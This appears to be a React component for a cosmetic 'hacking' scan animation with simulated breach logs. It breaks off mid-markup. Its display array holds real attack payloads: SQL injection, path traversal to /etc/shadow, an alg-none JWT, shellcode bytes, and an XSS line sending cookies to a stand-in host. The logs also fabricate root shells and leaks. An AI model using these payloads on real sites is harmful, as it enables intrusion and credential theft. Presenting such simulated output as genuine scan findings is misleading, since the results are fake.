import React, { useState, useEffect, useRef } from 'react';
import {
  Server,
  Lock,
  Unlock,
  Activity,
  Terminal,
  RefreshCw,
  Radio,
  AlertOctagon,
  Skull,
  Zap,
  Shield,
  ShieldAlert,
  ShieldCheck,
  X,
  Crosshair,
  Cpu,
  Flame,
  Bug,
  Code,
} from 'lucide-react';

interface SecuredServerAccessScanProps {
  domain: string;
  stepIndex: number;
  totalSteps: number;
  currentStepDescription: string;
  scanType: 'passive' | 'active' | 'both';
  isSecureOverride?: boolean | null;
  detectedScore?: number | null;
  onAbort?: () => void;
}

const EXPLOIT_VECTORS = [
  { name: 'SQL Injection', code: "admin' UNION SELECT null, user, password_hash FROM users--", target: '/api/auth/login' },
  { name: 'SSTI Template Injection', code: "{{7*7}} -> 49 (Jinja2/Twig Remote Eval)", target: '/search?q=' },
  { name: 'Path Traversal', code: '../../../../../../etc/shadow /proc/self/environ', target: '/download?file=' },
  { name: 'JWT Alg None', code: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.', target: '/api/v1/session' },
  { name: 'Buffer Overflow', code: '\\x90\\x90\\x90\\x90\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46', target: ':443 TLS buffer' },
  { name: 'XSS Vector', code: '<script>fetch("//c2.cyber.io/?c="+document.cookie)</script>', target: '/comments?post=1' },
];

export default function SecuredServerAccessScan({
  domain,
  stepIndex,
  totalSteps,
  currentStepDescription,
  scanType,
  isSecureOverride,
  detectedScore,
  onAbort,
}: SecuredServerAccessScanProps) {
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const [packetTick, setPacketTick] = useState(0);
  const [elapsedSeconds, setElapsedSeconds] = useState(0);
  const hackSpeed = 2;
  const [activeVectorIndex, setActiveVectorIndex] = useState(0);
  const [liveExploitLogs, setLiveExploitLogs] = useState<string[]>([]);
  const [targetIP] = useState(() => `104.${Math.floor(18 + Math.random() * 8)}.${Math.floor(64 + Math.random() * 60)}.${Math.floor(10 + Math.random() * 200)}`);
  const [packetsSent, setPacketsSent] = useState(1420);
  const [burstBeam, setBurstBeam] = useState(false);

  // Security mode: 'auto' | 'secure' | 'weak'
  const [forcedMode, setForcedMode] = useState<'auto' | 'secure' | 'weak'>('auto');

  // Determine effective security status
  const isEnterprise = [
    'chatgpt.com',
    'openai.com',
    'youtube.com',
    'google.com',
    'github.com',
    'microsoft.com',
    'apple.com',
    'cloudflare.com',
  ].some((d) => domain.toLowerCase().includes(d));

  const effectiveIsSecure =
    forcedMode === 'secure'
      ? true
      : forcedMode === 'weak'
      ? false
      : isSecureOverride !== null && isSecureOverride !== undefined
      ? isSecureOverride
      : detectedScore !== null && detectedScore !== undefined
      ? detectedScore >= 80
      : isEnterprise;

  // Automated HUD Dialog
  const [showStatusDialog, setShowStatusDialog] = useState(false);
  const [dialogDismissed, setDialogDismissed] = useState(false);

  // Elapsed hack timer
  useEffect(() => {
    const timer = setInterval(() => {
      setElapsedSeconds((prev) => prev + 1);
      setPacketsSent((prev) => prev + 85 * hackSpeed);
    }, 1000);
    return () => clearInterval(timer);
  }, [hackSpeed]);

  // Binary pulse & live exploit log emitter
  useEffect(() => {
    const interval = setInterval(() => {
      setPacketTick((prev) => (prev + 1) % 200);

      // Generate authentic real-time hacking lines
      const vector = EXPLOIT_VECTORS[Math.floor(Math.random() * EXPLOIT_VECTORS.length)];
      const memoryAddr = `0x7FFF${Math.floor(1000 + Math.random() * 8999).toString(16).toUpperCase()}`;

      let newLog = '';
      if (effectiveIsSecure) {
        const secureEvents = [
          `[${memoryAddr}] PROBE -> ${domain}${vector.target} [PAYLOAD DROPPED BY WAF]`,
          `[403 FORBIDDEN] Cloudflare/Edge Shield blocked vector: ${vector.name}`,
          `[TLS CIPHER] Hardware HSM rejected key exchange tampering on :443`,
          `[RATE_LIMIT] Target throttled connection: 104 requests / 50ms dropped`,
          `[DEFENSE] Zero-Trust parameter filter stripped payload: ${vector.code.slice(0, 30)}...`,
        ];
        newLog = secureEvents[Math.floor(Math.random() * secureEvents.length)];
      } else {
        const breachEvents = [
          `[${memoryAddr}] EXPLOIT INJECTED -> ${domain}${vector.target}`,
          `[200 OK] Parameter reflection validated! Vulnerable to ${vector.name}`,
          `[BUFFER CRACK] Siphoning stack memory: ${vector.code.slice(0, 32)}...`,
          `[SHELL STAGE] Reverse connection verified on :4444 -> uid=0(root)`,
          `[DATABASE LEAK] Extracted schema token: sha256_hash_valid (admin)`,
        ];
        newLog = breachEvents[Math.floor(Math.random() * breachEvents.length)];
      }

      setLiveExploitLogs((prev) => [newLog, ...prev.slice(0, 8)]);
    }, 450 / hackSpeed);

    return () => clearInterval(interval);
  }, [hackSpeed, effectiveIsSecure, domain]);

  // Trigger automated status dialog around step 2 without blocking
  useEffect(() => {
    if (stepIndex >= 2 && !dialogDismissed) {
      setShowStatusDialog(true);
    }
  }, [stepIndex, dialogDismissed]);

  const handleModeChange = (mode: 'auto' | 'secure' | 'weak') => {
    setForcedMode(mode);
    setShowStatusDialog(true);
    setDialogDismissed(false);
  };

  const triggerManualExploitBurst = () => {
    setBurstBeam(true);
    setPacketsSent((prev) => prev + 500);
    setTimeout(() => setBurstBeam(false), 800);
  };

  // -------------------------------------------------------------
  // HTML5 Canvas Hacking Animation (Matrix, Tracer Beams, Deflection)
  // -------------------------------------------------------------
  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    let animationFrameId: number;

    const setCanvasSize = () => {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    };
    setCanvasSize();

    const fontSize = 15;
    let columns = Math.floor(window.innerWidth / fontSize);
    let drops: number[] = Array.from({ length: columns }, () => Math.floor(Math.random() * -60));
    let speeds: number[] = Array.from({ length: columns }, () => (1.0 + Math.random() * 2.5) * hackSpeed);

    // Floating 0 and 1 particles
    const particleCount = 70;
    interface Particle {
      x: number;
      y: number;
      vx: number;
      vy: number;
      char: '0' | '1';
      size: number;
      alpha: number;
    }

    const particles: Particle[] = Array.from({ length: particleCount }, () => ({
      x: Math.random() * window.innerWidth,
      y: Math.random() * window.innerHeight,
      vx: (Math.random() - 0.5) * 3 * hackSpeed,
      vy: (Math.random() - 0.5) * 3 * hackSpeed,
      char: Math.random() > 0.5 ? '1' : '0',
      size: 13 + Math.random() * 8,
      alpha: 0.3 + Math.random() * 0.7,
    }));

    const onResizeUpdate = () => {
      setCanvasSize();
      columns = Math.floor(window.innerWidth / fontSize);
      drops = Array.from({ length: columns }, () => Math.floor(Math.random() * -60));
      speeds = Array.from({ length: columns }, () => (1.0 + Math.random() * 2.5) * hackSpeed);
    };
    window.addEventListener('resize', onResizeUpdate);

    let tickCount = 0;

    const render = () => {
      tickCount++;
      // Dark trail fade effect
      ctx.fillStyle = effectiveIsSecure ? 'rgba(2, 5, 14, 0.16)' : 'rgba(2, 6, 18, 0.16)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      const centerX = canvas.width / 2;
      const centerY = canvas.height / 2;
      const targetRadius = 160;

      // 1. Render Matrix Vertical 0 and 1 Rain
      ctx.font = 'bold 15px "JetBrains Mono", monospace';

      for (let i = 0; i < drops.length; i++) {
        const char = Math.random() > 0.5 ? '1' : '0';
        const x = i * fontSize;
        let y = drops[i] * fontSize;

        const dx = x - centerX;
        const dy = y - centerY;
        const dist = Math.sqrt(dx * dx + dy * dy);

        if (effectiveIsSecure && dist < targetRadius) {
          // Deflection sparks
          ctx.fillStyle = '#ef4444';
          ctx.shadowColor = '#f87171';
          ctx.shadowBlur = 10;
          ctx.fillText(char, x + (dx > 0 ? 14 : -14), y);
        } else {
          if (Math.random() > 0.86) {
            ctx.fillStyle = '#ffffff'; // Glistening white head
            ctx.shadowColor = effectiveIsSecure ? '#f87171' : '#34d399';
            ctx.shadowBlur = 8;
          } else if (effectiveIsSecure) {
            ctx.fillStyle = Math.random() > 0.5 ? '#f87171' : '#b91c1c';
            ctx.shadowBlur = 3;
          } else {
            ctx.fillStyle = Math.random() > 0.5 ? '#10b981' : '#047857';
            ctx.shadowBlur = 3;
          }
          ctx.fillText(char, x, y);
        }

        if (y > canvas.height && Math.random() > 0.975) {
          drops[i] = 0;
        }
        drops[i] += speeds[i];
      }

      // 2. Tactical Infiltration Attack Beams (Hacking Streams)
      ctx.save();
      const beamCount = burstBeam ? 8 : 4;
      for (let b = 0; b < beamCount; b++) {
        const angle = (tickCount * 0.02 + (b * Math.PI * 2) / beamCount);
        const originX = centerX + Math.cos(angle) * (canvas.width * 0.45);
        const originY = centerY + Math.sin(angle) * (canvas.height * 0.45);

        ctx.beginPath();
        ctx.moveTo(originX, originY);
        ctx.lineTo(centerX, centerY);
        ctx.lineWidth = burstBeam ? 2.5 : 1.2;
        ctx.strokeStyle = effectiveIsSecure ? 'rgba(239, 68, 68, 0.25)' : 'rgba(16, 185, 129, 0.35)';
        ctx.stroke();

        // Pulsing binary text along attack vectors
        const midX = (originX + centerX) / 2;
        const midY = (originY + centerY) / 2;
        ctx.font = '10px "JetBrains Mono", monospace';
        ctx.fillStyle = effectiveIsSecure ? 'rgba(248, 113, 113, 0.7)' : 'rgba(52, 211, 153, 0.7)';
        ctx.fillText('010101', midX, midY);
      }
      ctx.restore();

      // 3. Floating 0 & 1 particles (deflected or vortexed)
      particles.forEach((p) => {
        if (!effectiveIsSecure) {
          // Vortex attraction towards central target
          const dx = centerX - p.x;
          const dy = centerY - p.y;
          const dist = Math.sqrt(dx * dx + dy * dy);
          if (dist > 25) {
            p.vx += (dx / dist) * 0.16 * hackSpeed;
            p.vy += (dy / dist) * 0.16 * hackSpeed;
          }
        } else {
          // Repel outward from target defense shield
          const dx = p.x - centerX;
          const dy = p.y - centerY;
          const dist = Math.sqrt(dx * dx + dy * dy);
          if (dist < targetRadius + 50) {
            p.vx += (dx / (dist || 1)) * 0.45 * hackSpeed;
            p.vy += (dy / (dist || 1)) * 0.45 * hackSpeed;
          }
        }

        p.vx *= 0.96;
        p.vy *= 0.96;
        p.x += p.vx;
        p.y += p.vy;

        if (p.x < 0) p.x = canvas.width;
        if (p.x > canvas.width) p.x = 0;
        if (p.y < 0) p.y = canvas.height;
        if (p.y > canvas.height) p.y = 0;

        ctx.font = `bold ${p.size}px "JetBrains Mono", monospace`;
        ctx.fillStyle = effectiveIsSecure ? `rgba(239, 68, 68, ${p.alpha})` : `rgba(16, 185, 129, ${p.alpha})`;
        ctx.shadowColor = effectiveIsSecure ? '#ef4444' : '#10b981';
        ctx.shadowBlur = 5;
        ctx.fillText(p.char, p.x, p.y);
      });

      // 4. Central Target Reticle & Crosshairs
      ctx.save();
      ctx.beginPath();
      ctx.arc(centerX, centerY, targetRadius - 20, 0, Math.PI * 2);
      ctx.lineWidth = 1.5;
      ctx.strokeStyle = effectiveIsSecure ? 'rgba(239, 68, 68, 0.4)' : 'rgba(16, 185, 129, 0.4)';
      ctx.setLineDash([6, 6]);
      ctx.stroke();

      // Rotating Radar Sweeper
      const sweepAngle = tickCount * 0.04 * hackSpeed;
      ctx.beginPath();
      ctx.moveTo(centerX, centerY);
      ctx.arc(centerX, centerY, targetRadius - 20, sweepAngle, sweepAngle + 0.35);
      ctx.closePath();
      ctx.fillStyle = effectiveIsSecure ? 'rgba(239, 68, 68, 0.15)' : 'rgba(16, 185, 129, 0.15)';
      ctx.fill();

      ctx.restore();

      animationFrameId = requestAnimationFrame(render);
    };

    render();

    return () => {
      cancelAnimationFrame(animationFrameId);
      window.removeEventListener('resize', setCanvasSize);
      window.removeEventListener('resize', onResizeUpdate);
    };
  }, [effectiveIsSecure, hackSpeed, burstBeam]);

  const progressPercent = Math.min(100, Math.round(((stepIndex + 1) / Math.max(1, totalSteps)) * 100));

  const binaryMarquees = [
    '010101010 0100101011 0101010 11010010 01010101 00101101 010101010',
    '101010101 0010110100 1010101 00101101 10101010 11010010 101010101',
    '01001000 01100001 01100011 01101011 01101001 01101110 01100111 00100000',
  ];

  return (
    <div className={`fixed inset-0 z-[9999] w-screen h-screen ${effectiveIsSecure ? 'bg-[#02050e]' : 'bg-[#01040a]'} text-emerald-400 font-mono flex flex-col justify-between overflow-hidden select-none p-3 sm:p-6 transition-colors duration-700 cyber-scanlines`}>
      {/* 1. HTML5 FULLSCREEN MATRIX RAIN & PARTICLE CANVAS */}
      <canvas ref={canvasRef} className="absolute inset-0 w-full h-full pointer-events-none opacity-60 z-0" />

      {/* 2. CRT Vignette & Ambient Radial Shadow */}
      <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,transparent_25%,rgba(1,4,10,0.94)_100%)] pointer-events-none z-[1]" />

      {/* 3. Background Dominating Binary Watermark Strings */}
      <div className="absolute inset-0 flex flex-col justify-around pointer-events-none z-[1] opacity-15 overflow-hidden font-extrabold text-xs sm:text-sm tracking-widest">
        <div className={`whitespace-nowrap animate-marquee ${effectiveIsSecure ? 'text-red-400' : 'text-emerald-300'}`}>
          010101010 0100101011 0101010 • {binaryMarquees[0]} • 010101010 0100101011 0101010
        </div>
        <div className={`whitespace-nowrap translate-x-20 opacity-70 ${effectiveIsSecure ? 'text-red-500' : 'text-emerald-400'}`}>
          {binaryMarquees[1]} • 010101010 0100101011 0101010 • {binaryMarquees[1]}
        </div>
        <div className={`whitespace-nowrap -translate-x-16 opacity-80 ${effectiveIsSecure ? 'text-red-400' : 'text-emerald-300'}`}>
          010101010 0100101011 0101010 • {binaryMarquees[2]} • 010101010 0100101011 0101010
        </div>
      </div>

      {/* 4. TOP HUD BAR: Tactical Offensive Hacking Command Header */}
      <header className={`relative z-10 flex flex-wrap items-center justify-between gap-3 border ${effectiveIsSecure ? 'border-red-500/50 bg-[#060a17]/90' : 'border-emerald-500/50 bg-[#040c14]/90'} p-3 sm:p-4 rounded-2xl backdrop-blur-xl shadow-2xl transition-colors duration-500`}>
        <div className="flex items-center gap-3">
          <div className="relative">
            <span className="flex h-4 w-4 relative">
              <span className={`animate-ping absolute inline-flex h-full w-full rounded-full ${effectiveIsSecure ? 'bg-red-400' : 'bg-emerald-400'} opacity-90`}></span>
              <span className={`relative inline-flex rounded-full h-4 w-4 ${effectiveIsSecure ? 'bg-red-500 shadow-[0_0_15px_#ef4444]' : 'bg-emerald-500 shadow-[0_0_15px_#10b981]'}`}></span>
            </span>
          </div>

          <div>
            <div className="flex items-center gap-2 flex-wrap">
              <span className={`text-xs sm:text-sm font-black tracking-widest uppercase px-2.5 py-0.5 rounded flex items-center gap-1.5 ${effectiveIsSecure ? 'bg-red-950/90 border border-red-500/60 text-red-300 shadow-[0_0_12px_rgba(239,68,68,0.4)]' : 'bg-emerald-950/90 border border-emerald-500/60 text-emerald-300 shadow-[0_0_12px_rgba(16,185,129,0.4)]'}`}>
                <Terminal className="w-3.5 h-3.5 animate-pulse" />
                <span>
                  {effectiveIsSecure ? 'TARGET PENETRATION SESSION // [FIREWALL ENGAGED]' : 'TARGET PENETRATION SESSION // [ROOT PERIMETER BREACHED]'}
                </span>
              </span>

              <span className={`text-[10px] px-2 py-0.5 rounded font-black flex items-center gap-1 ${effectiveIsSecure ? 'bg-red-500/20 text-red-400 border border-red-500/50' : 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/50'}`}>
                {effectiveIsSecure ? <ShieldAlert className="w-3 h-3" /> : <Skull className="w-3 h-3" />}
                {effectiveIsSecure ? 'DEFENSE: ACCESS DENIED' : 'EXPLOIT: ACCESS GRANTED'}
              </span>
            </div>

            {/* Target Telemetry line */}
            <div className="flex items-center gap-3 mt-1 flex-wrap">
              <div className="flex items-center gap-1 text-xs">
                <span className="text-slate-400 uppercase tracking-wider text-[11px]">TARGET:</span>
                <span className="text-white font-black underline decoration-emerald-500/60">{domain}</span>
              </div>
              <span className="text-[10px] text-slate-500 font-mono">IP: {targetIP}</span>
              <span className="text-[10px] text-slate-500 font-mono">PORT: 443 (HTTPS)</span>
              <span className="text-[10px] text-slate-400 font-mono">PAYLOADS: {packetsSent.toLocaleString()}</span>
            </div>
          </div>
        </div>

        {/* Right Tactical Controls */}
        <div className="flex items-center gap-2 flex-wrap">
          {/* Burst Fire Exploit Button */}
          <button
            onClick={triggerManualExploitBurst}
            className="flex items-center gap-1 px-3 py-1.5 rounded-xl border border-amber-500/60 bg-amber-950/70 text-amber-300 hover:bg-amber-900 text-xs font-bold transition-all cursor-pointer shadow-[0_0_10px_rgba(245,158,11,0.2)]"
            title="Inject rapid zero-day payload packet burst"
          >
            <Flame className="w-3.5 h-3.5 text-amber-400 animate-pulse" />
            <span className="hidden sm:inline">Inject Burst</span>
          </button>

          {/* Simulate Mode Switcher */}
          <div className="flex items-center bg-slate-950 border border-slate-800 rounded-xl p-0.5 text-[10px] font-bold">
            <button
              onClick={() => handleModeChange('secure')}
              className={`px-2.5 py-1 rounded-lg transition-all cursor-pointer ${
                effectiveIsSecure
                  ? 'bg-red-950 text-red-300 border border-red-500/60 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
                  : 'text-slate-400 hover:text-slate-200'
              }`}
              title="Simulate Hardened Target (Access Denied)"
            >
              Secure
            </button>
            <button
              onClick={() => handleModeChange('weak')}
              className={`px-2.5 py-1 rounded-lg transition-all cursor-pointer ${
                !effectiveIsSecure
                  ? 'bg-emerald-950 text-emerald-300 border border-emerald-500/60 shadow-[0_0_8px_rgba(16,185,129,0.3)]'
                  : 'text-slate-400 hover:text-slate-200'
              }`}
              title="Simulate Vulnerable Target (Access Granted)"
            >
              Weak
            </button>
          </div>

          {onAbort && (
            <button
              onClick={onAbort}
              className="bg-red-950/80 hover:bg-red-900 text-red-300 border border-red-500/50 px-2.5 py-1.5 rounded-xl text-xs font-bold transition-all cursor-pointer flex items-center gap-1 shadow-md"
              title="Return to dashboard"
            >
              <X className="w-3.5 h-3.5" />
              <span className="hidden sm:inline">Close</span>
            </button>
          )}
        </div>
      </header>

      {/* 5. DOMINATING COMPUTER LANGUAGE 0 & 1 STREAM IN MOTION */}
      <div className={`relative z-10 w-full py-1.5 px-4 shadow-lg my-1.5 backdrop-blur-md border-y-2 ${effectiveIsSecure ? 'bg-[#040817]/95 border-red-500/60' : 'bg-[#020b14]/95 border-emerald-500/60'}`}>
        <div className="flex items-center justify-between text-xs font-bold mb-0.5">
          <span className="flex items-center gap-2">
            <Zap className={`w-3.5 h-3.5 animate-pulse ${effectiveIsSecure ? 'text-red-400' : 'text-emerald-400'}`} />
            <span className="tracking-widest uppercase text-[11px]">
              {effectiveIsSecure ? 'DEFLECTION MATRIX // REPELLING BINARY OPCODES:' : 'MACHINE OPCODES PENETRATING TARGET BUFFER:'}
            </span>
          </span>
          <span className="text-white font-mono tracking-wider animate-pulse text-[11px]">
            STREAM RATE: {(2.4 * hackSpeed).toFixed(1)} MB/s
          </span>
        </div>

        {/* Rapid cascading 0 and 1 streams dominating monitor */}
        <div className={`text-sm sm:text-base font-black tracking-widest select-none overflow-hidden flex items-center gap-4 ${effectiveIsSecure ? 'text-red-400' : 'text-emerald-300'}`}>
          <span className="text-white font-extrabold animate-pulse">010101010 0100101011 0101010</span>
          <span>11010010 01010101 00101101</span>
          <span className="text-white font-extrabold animate-pulse hidden md:inline">010101010 0100101011 0101010</span>
          <span className="hidden lg:inline text-amber-300">01001000 01100001 01100011 01101011</span>
        </div>
      </div>

      {/* 6. CENTER TACTICAL HACKING WORKSPACE */}
      <main className="relative z-10 flex-1 flex flex-col justify-center items-center max-w-6xl w-full mx-auto my-1 gap-3">
        <div className="grid grid-cols-1 md:grid-cols-12 gap-4 w-full items-stretch">
          
          {/* Left Column: Exploit Payload Stager & Memory Registers */}
          <div className="md:col-span-4 bg-[#030914]/90 border border-slate-800/90 p-3.5 rounded-2xl flex flex-col justify-between shadow-2xl backdrop-blur-xl">
            <div>
              <div className="flex items-center justify-between border-b border-slate-800 pb-2 mb-2.5">
                <div className="flex items-center gap-1.5">
                  <Bug className="w-4 h-4 text-emerald-400" />
                  <span className="text-xs font-bold text-white uppercase tracking-wider">Exploit Vectors</span>
                </div>
                <span className="text-[10px] text-emerald-400 font-mono px-1.5 py-0.5 rounded bg-emerald-950/60 border border-emerald-500/30">
                  ACTIVE_STAGE
                </span>
              </div>

              {/* Exploit Vector List */}
              <div className="space-y-1.5">
                {EXPLOIT_VECTORS.slice(0, 4).map((vec, idx) => (
                  <div
                    key={vec.name}
                    onClick={() => setActiveVectorIndex(idx)}
                    className={`p-2 rounded-xl border text-xs cursor-pointer transition-all ${
                      activeVectorIndex === idx
                        ? 'bg-emerald-950/50 border-emerald-500/60 text-white shadow-md'
                        : 'bg-slate-950/40 border-slate-800/80 text-slate-400 hover:text-slate-200'
                    }`}
                  >
                    <div className="flex items-center justify-between font-bold">
                      <span>{vec.name}</span>
                      <span className="text-[10px] text-emerald-400 font-mono">{vec.target}</span>
                    </div>
                    <p className="text-[10px] font-mono text-slate-400 truncate mt-0.5 opacity-80">
                      {vec.code}
                    </p>
                  </div>
                ))}
              </div>
            </div>

            {/* Target Memory Registers */}
            <div className="mt-2.5 pt-2 border-t border-slate-800/80 text-[10px] font-mono">
              <div className="flex justify-between text-slate-500 mb-1">
                <span>REGISTER HEAP</span>
                <span className="text-emerald-400">0x7FFF_ALLOC</span>
              </div>
              <div className="bg-slate-950/80 p-2 rounded-lg border border-slate-850 text-slate-300 space-y-0.5">
                <div className="flex justify-between">
                  <span className="text-slate-500">RAX: 0x00007FFE41B0</span>
                  <span className="text-slate-500">RBX: 0x000000000001</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">RCX: 0x000000000020</span>
                  <span className={effectiveIsSecure ? 'text-red-400' : 'text-emerald-400'}>
                    RIP: {effectiveIsSecure ? '0xDEADBEEF (TRAP)' : '0x7FFF0040 (SHELL)'}
                  </span>
                </div>
              </div>
            </div>
          </div>

          {/* Center Column: Live Target Radar & Penetration Core */}
          <div className="md:col-span-4 flex flex-col items-center justify-center p-2">
            {/* Live Ingress Connection Track */}
            <div className="w-full relative flex items-center justify-center py-2">
              <div className={`w-full h-1 rounded-full opacity-80 ${effectiveIsSecure ? 'bg-gradient-to-r from-slate-700 via-red-500 to-slate-700' : 'bg-gradient-to-r from-emerald-600 via-white to-emerald-600'}`}></div>

              <div
                className={`absolute h-3 w-12 rounded-full blur-[2px] transition-all duration-100 ${effectiveIsSecure ? 'bg-red-400 shadow-[0_0_10px_#ef4444]' : 'bg-emerald-300 shadow-[0_0_10px_#10b981]'}`}
                style={{ left: `${(packetTick * 1.5) % 85}%` }}
              />

              <div className={`absolute bg-[#030712] border-2 px-3 py-1 rounded-full text-[11px] font-black flex items-center gap-1.5 shadow-2xl ${effectiveIsSecure ? 'border-red-500 text-red-400 shadow-[0_0_20px_rgba(239,68,68,0.4)]' : 'border-emerald-400 text-emerald-300 shadow-[0_0_20px_rgba(16,185,129,0.4)]'}`}>
                <Activity className="w-3 h-3 animate-spin" />
                <span>
                  {effectiveIsSecure ? 'ACCESS DENIED: REPELLING' : 'ACCESS GRANTED: PENETRATING'}
                </span>
              </div>
            </div>

            {/* Central Radar Target Disc */}
            <div className="relative w-44 h-44 sm:w-52 sm:h-52 flex items-center justify-center my-2">
              <div className={`absolute inset-0 rounded-full border-2 animate-ping opacity-30 ${effectiveIsSecure ? 'border-red-500' : 'border-emerald-500'}`} />
              <div className={`absolute inset-2 rounded-full border-2 border-dashed animate-spin [animation-duration:8s] ${effectiveIsSecure ? 'border-red-400/60' : 'border-emerald-400/60'}`} />
              <div className="absolute inset-6 rounded-full border border-slate-700/50" />

              {/* Crosshair reticle lines */}
              <div className="absolute inset-0 flex items-center justify-center pointer-events-none opacity-40">
                <div className="w-full h-[1px] bg-emerald-500/50" />
                <div className="h-full w-[1px] bg-emerald-500/50 absolute" />
              </div>

              {/* Target Website Node Core */}
              <div className={`w-24 h-24 rounded-full bg-[#02050e] border-2 flex flex-col items-center justify-center shadow-2xl relative z-10 text-center p-2 ${effectiveIsSecure ? 'border-red-500 shadow-[0_0_35px_rgba(239,68,68,0.6)]' : 'border-emerald-400 shadow-[0_0_35px_rgba(16,185,129,0.6)]'}`}>
                {effectiveIsSecure ? (
                  <Server className="w-7 h-7 text-red-400 animate-pulse" />
                ) : (
                  <Unlock className="w-7 h-7 text-emerald-300 animate-bounce" />
                )}
                <span className={`text-[8px] font-black uppercase mt-1 tracking-wider ${effectiveIsSecure ? 'text-red-300' : 'text-emerald-300'}`}>
                  {effectiveIsSecure ? 'WAF DEFENSE' : 'ROOT BREACH'}
                </span>
                <span className="text-[7px] text-slate-400 font-mono truncate max-w-[80px]">
                  {domain}
                </span>
              </div>
            </div>

            <p className={`text-xs font-black tracking-wide text-center drop-shadow-md mt-1 ${effectiveIsSecure ? 'text-red-300' : 'text-emerald-200'}`}>
              {effectiveIsSecure
                ? 'TARGET FORTIFIED: 0 & 1 OPCODES REFLECTED'
                : 'SECURITY WEAKNESS DETECTED: 0 & 1 FLOODING ROOT CORE'}
            </p>
          </div>

          {/* Right Column: Live Exploit Injection Telemetry Terminal */}
          <div className="md:col-span-4 bg-[#030914]/90 border border-slate-800/90 p-3.5 rounded-2xl flex flex-col justify-between shadow-2xl backdrop-blur-xl">
            <div>
              <div className="flex items-center justify-between border-b border-slate-800 pb-2 mb-2">
                <div className="flex items-center gap-1.5">
                  <Terminal className="w-4 h-4 text-emerald-400" />
                  <span className="text-xs font-bold text-white uppercase tracking-wider">Exploit Injection Stream</span>
                </div>
                <span className="text-[10px] text-amber-400 font-mono animate-pulse">
                  LIVE_PROBE
                </span>
              </div>

              {/* Streaming Hacker Output Logs */}
              <div className="bg-slate-950/80 p-2 rounded-xl border border-slate-850 h-[190px] overflow-y-auto font-mono text-[10px] leading-relaxed text-slate-300 space-y-1 scrollbar-thin">
                {liveExploitLogs.map((log, index) => (
                  <div
                    key={index}
                    className={`transition-all duration-200 ${
                      log.includes('403') || log.includes('DROPPED') || log.includes('BLOCKED')
                        ? 'text-red-400/90'
                        : log.includes('200') || log.includes('INJECTED') || log.includes('SHELL')
                        ? 'text-emerald-300 font-bold'
                        : 'text-slate-400'
                    }`}
                  >
                    {log}
                  </div>
                ))}
                <div className="text-emerald-400/60 animate-pulse pl-2 border-l border-emerald-500/40">
                  &gt; injecting automated security test probes...
                </div>
              </div>
            </div>

            {/* Quick Hacker Diagnostic Footprint */}
            <div className="mt-2 pt-2 border-t border-slate-800/80 grid grid-cols-2 gap-2 text-[10px]">
              <div className="bg-slate-950/60 p-1.5 rounded border border-slate-850">
                <span className="text-slate-500 block">WAF PERIMETER</span>
                <span className={`font-bold ${effectiveIsSecure ? 'text-red-400' : 'text-emerald-400'}`}>
                  {effectiveIsSecure ? 'ENTERPRISE_WAF' : 'UNPROTECTED'}
                </span>
              </div>
              <div className="bg-slate-950/60 p-1.5 rounded border border-slate-850">
                <span className="text-slate-500 block">HOST EXPOSURE</span>
                <span className={`font-bold ${effectiveIsSecure ? 'text-slate-300' : 'text-amber-400'}`}>
                  {effectiveIsSecure ? '4% SURFACE' : '82% HIGH_RISK'}
                </span>
              </div>
            </div>
          </div>

        </div>

        {/* Live Attack Diagnostic Metric Badges */}
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5 w-full text-xs">
          <div className="bg-[#030914]/90 border border-slate-800/80 p-2.5 rounded-xl flex flex-col justify-between shadow-md">
            <span className="text-[10px] text-slate-500 uppercase font-black">Transport Cryptography</span>
            <span className="text-xs font-black text-white mt-0.5">TLS 1.3 / AES-256-GCM</span>
            <span className={`text-[9px] font-bold ${effectiveIsSecure ? 'text-emerald-400' : 'text-amber-400'}`}>
              {effectiveIsSecure ? 'CRYPTO_HARDENED' : 'CIPHER_DOWNGRADE'}
            </span>
          </div>

          <div className="bg-[#030914]/90 border border-slate-800/80 p-2.5 rounded-xl flex flex-col justify-between shadow-md">
            <span className="text-[10px] text-slate-500 uppercase font-black">Firewall Rule Engine</span>
            <span className="text-xs font-black text-white mt-0.5">
              {effectiveIsSecure ? 'Edge WAF Active' : 'No WAF Barrier'}
            </span>
            <span className={`text-[9px] font-bold ${effectiveIsSecure ? 'text-emerald-400' : 'text-red-400'}`}>
              {effectiveIsSecure ? 'CORP_FIREWALL' : 'OPEN_REFLECTION'}
            </span>
          </div>

          <div className="bg-[#030914]/90 border border-slate-800/80 p-2.5 rounded-xl flex flex-col justify-between shadow-md">
            <span className="text-[10px] text-slate-500 uppercase font-black">Payload Defense</span>
            <span className="text-xs font-black text-white mt-0.5">
              {effectiveIsSecure ? 'Payloads Dropped' : 'Root Penetrated'}
            </span>
            <span className={`text-[9px] font-bold ${effectiveIsSecure ? 'text-emerald-400' : 'text-red-400'}`}>
              {effectiveIsSecure ? 'DEFLECTION_ACTIVE' : 'EXPLOIT_CONNECTED'}
            </span>
          </div>

          <div className="bg-[#030914]/90 border border-slate-800/80 p-2.5 rounded-xl flex flex-col justify-between shadow-md">
            <span className="text-[10px] text-slate-500 uppercase font-black">Penetration Posture</span>
            <span className="text-xs font-black text-white mt-0.5">
              {effectiveIsSecure ? 'Blocked (0/1 Deflected)' : 'Breached (0/1 Flooded)'}
            </span>
            <span className={`text-[9px] font-bold ${effectiveIsSecure ? 'text-red-400' : 'text-emerald-400'}`}>
              {effectiveIsSecure ? '0% BUFFER_ACCESS' : '100% EXPLOIT_FLOW'}
            </span>
          </div>
        </div>
      </main>

      {/* 7. AUTOMATED HUD STATUS DIALOG (NON-BLOCKING - ZERO MANUAL CLICKS REQUIRED) */}
      {showStatusDialog && (
        <div className="fixed bottom-24 sm:bottom-28 right-4 sm:right-6 z-40 max-w-sm sm:max-w-md w-[calc(100%-2rem)] sm:w-[420px] animate-in slide-in-from-bottom-5 fade-in duration-300 pointer-events-auto">
          <div
